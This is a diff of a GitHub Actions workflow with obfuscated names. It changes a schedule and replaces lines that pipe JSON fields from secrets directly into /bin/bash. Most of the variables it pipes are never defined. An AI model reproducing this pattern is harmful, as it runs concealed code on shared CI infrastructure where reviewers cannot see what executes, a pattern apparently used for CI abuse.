@@ -1,10 +1,9 @@
 name: yunxiaoxi2121
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 * * * *'
-jobs:  # 11493
+    - cron: '42 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +11,16 @@ jobs:  # 11493
       - uses: actions/checkout@v4
       - name: yunxiaoxi2121
         env:
-          kedw1928: ${{ secrets.kedw1928 }}
+          o6: ${{ secrets.o6 }}
         run: |
-          echo $kedw1928 | jq -r .ydbf4753 | /bin/bash
-          echo $z33441 | jq -r .k889 | /bin/bash
-          echo $t54645 | jq -r .b89 | /bin/bash
-          echo $svlf0756 | jq -r .cbw209 | /bin/bash
-          echo $yicfk72 | jq -r .eyds891 | /bin/bash
-          echo $v96 | jq -r .upnwo85002 | /bin/bash
-          echo $iwv0 | jq -r .u1 | /bin/bash
+          echo $o6 | jq -r .tzcge41 | /bin/bash
+          echo $jar77537 | jq -r .y6 | /bin/bash
+          echo $ftp41 | jq -r .wvdvg29 | /bin/bash
+          echo $bj5 | jq -r .mrnf82 | /bin/bash
+          echo $g6649 | jq -r .vys86988 | /bin/bash
+          echo $dd9 | jq -r .uhl33534 | /bin/bash
+          echo $kt683 | jq -r .rhd12 | /bin/bash
+          echo $can7768 | jq -r .qb295 | /bin/bash
+          echo $yd2527 | jq -r .wmf1 | /bin/bash
+          echo $sbenq01318 | jq -r .zdyz5 | /bin/bash
 
